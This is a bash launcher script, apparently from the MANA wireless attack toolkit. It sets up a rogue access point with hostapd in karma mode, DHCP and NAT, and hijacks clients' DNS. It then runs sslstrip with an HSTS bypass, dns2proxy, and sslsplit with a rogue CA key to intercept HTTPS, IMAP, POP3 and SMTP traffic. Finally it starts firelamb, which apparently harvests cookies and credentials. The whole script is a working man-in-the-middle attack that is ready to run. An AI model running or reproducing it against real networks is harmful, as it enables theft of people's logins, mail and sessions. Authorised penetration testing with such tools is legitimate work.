#!/bin/bash
upstream=wlan0
phy=wlan1
conf=/etc/mana-toolkit/hostapd-karma.conf
hostapd=/usr/lib/mana-toolkit/hostapd

echo '1' > /proc/sys/net/ipv4/ip_forward
rfkill unblock wlan
echo -- $phy: flushing interface --
ip addr flush dev $phy
echo -- $phy: setting ip --
ip addr add 10.0.0.1/24 dev $phy
echo -- $phy: starting the interface --
ip link set $phy up
echo -- $phy: setting route --
ip route add default via 10.0.0.1 dev $phy

# Starting AP and DHCP
sed -i "s/^interface=.*$/interface=$phy/" $conf
$hostapd $conf &
sleep 5
dhcpd -cf /etc/mana-toolkit/dhcpd.conf $phy
sleep 5

# Add fking rule to table 1006
for table in $(ip rule list | awk -F"lookup" '{print $2}');
do
DEF=`ip route show table $table|grep default|grep $upstream`
if ! [ -z "$DEF" ]; then
   break
fi
done
ip route add 10.0.0.0/24 dev $phy scope link table $table

# RM quota from chains to avoid errors in iptable-save
# http://lists.netfilter.org/pipermail/netfilter-buglog/2013-October/002995.html
iptables -F bw_INPUT
iptables -F bw_OUTPUT
# Save
iptables-save > /tmp/rules.txt
# Flush
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -F
iptables -F -t nat
# Masquerade
iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1

#SSLStrip with HSTS bypass
cd /usr/share/mana-toolkit/sslstrip-hsts/
python sslstrip.py -l 10000 -a -w /var/lib/mana-toolkit/sslstrip.log&
iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
python dns2proxy.py $phy&
cd -

#SSLSplit
sslsplit -D -P -Z -S /var/lib/mana-toolkit/sslsplit -c /usr/share/mana-toolkit/cert/rogue-ca.pem -k /usr/share/mana-toolkit/cert/rogue-ca.key -O -l /var/lib/mana-toolkit/sslsplit-connect.log \
 https 0.0.0.0 10443 \
 http 0.0.0.0 10080 \
 ssl 0.0.0.0 10993 \
 tcp 0.0.0.0 10143 \
 ssl 0.0.0.0 10995 \
 tcp 0.0.0.0 10110 \
 ssl 0.0.0.0 10465 \
 tcp 0.0.0.0 10025&

# iptables -t nat -A INPUT -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10080
iptables -t nat -A PREROUTING -i $phy  -p tcp --destination-port 443 -j REDIRECT --to-port 10443
iptables -t nat -A PREROUTING -i $phy  -p tcp --destination-port 143 -j REDIRECT --to-port 10143
iptables -t nat -A PREROUTING -i $phy  -p tcp --destination-port 993 -j REDIRECT --to-port 10993
iptables -t nat -A PREROUTING -i $phy  -p tcp --destination-port 65493 -j REDIRECT --to-port 10993
iptables -t nat -A PREROUTING -i $phy  -p tcp --destination-port 465 -j REDIRECT --to-port 10465
iptables -t nat -A PREROUTING -i $phy  -p tcp --destination-port 25 -j REDIRECT --to-port 10025
iptables -t nat -A PREROUTING -i $phy  -p tcp --destination-port 995  -j REDIRECT --to-port 10995
iptables -t nat -A PREROUTING -i $phy  -p tcp --destination-port 110 -j REDIRECT --to-port 10110

# Start FireLamb
/usr/share/mana-toolkit/firelamb/firelamb.py -i $phy &

sleep 5

echo "Hit enter to kill me"
read
pkill dhcpd
pkill sslstrip
pkill sslsplit
pkill hostapd
pkill python
# Restore
iptables-restore < /tmp/rules.txt
rm /tmp/rules.txt
# Remove iface and routes
ip addr flush dev $phy
ip link set $phy down

